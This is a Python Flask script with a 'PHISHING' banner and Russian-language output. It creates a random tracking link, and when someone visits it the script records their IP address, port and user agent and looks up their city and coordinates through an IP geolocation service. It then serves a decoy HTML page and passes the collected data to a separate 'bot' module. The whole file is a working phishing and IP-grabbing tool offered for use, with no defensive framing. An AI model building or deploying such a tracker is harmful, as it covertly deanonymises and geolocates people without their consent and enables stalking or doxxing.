import socket
import threading
from flask import Flask, request, render_template_string
import requests
import json
import random
import string

app = Flask(__name__)

BANNER = """
██████╗░██╗░░██╗██╗░██████╗██╗░░██╗██╗███╗░░██╗░██████╗░
██╔══██╗██║░░██║██║██╔════╝██║░░██║██║████╗░██║██╔════╝░
██████╔╝███████║██║╚█████╗░███████║██║██╔██╗██║██║░░██╗░
██╔═══╝░██╔══██║██║░╚═══██╗██╔══██║██║██║╚████║██║░░╚██╗
██║░░░░░██║░░██║██║██████╔╝██║░░██║██║██║░╚███║╚██████╔╝
╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░
"""

tracking_data = {}

def generate_url():
    chars = string.ascii_lowercase + string.digits
    token = ''.join(random.choice(chars) for _ in range(10))
    return f"http://localhost:5000/{token}"

def get_ip_info(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        data = response.json()
        return data
    except:
        return {}

def start_bot(info):
    import bot
    bot.send_info(info)

@app.route('/<token>')
def track_visit(token):
    if token not in tracking_data:
        return "Not Found", 404
    
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    
    ip_info = get_ip_info(ip)
    
    info = {
        'ip': ip,
        'port': request.environ.get('REMOTE_PORT'),
        'user_agent': user_agent,
        'country': ip_info.get('country', 'N/A'),
        'city': ip_info.get('city', 'N/A'),
        'lon': ip_info.get('lon', 'N/A'),
        'lat': ip_info.get('lat', 'N/A')
    }
    
    tracking_data[token] = info
    
    with open('onion.html', 'r', encoding='utf-8') as f:
        html_content = f.read()
    
    return html_content

def start_flask():
    app.run(host='0.0.0.0', port=5000, debug=False)

if __name__ == "__main__":
    print(BANNER)
    
    flask_thread = threading.Thread(target=start_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    url = generate_url()
    tracking_data[url.split('/')[-1]] = None
    
    print(f"Сгенерированная ссылка: {url}")
    print("Началось отслеживание переходов по ссылке...")
    
    while True:
        token = url.split('/')[-1]
        if tracking_data.get(token):
            info = tracking_data[token]
            print(f"""
Обнаружен переход по ссылке:

Информация о сети:
├IP - адрес: {info['ip']}
├User - Agent: {info['user_agent']}
""")
            start_bot(info)
            break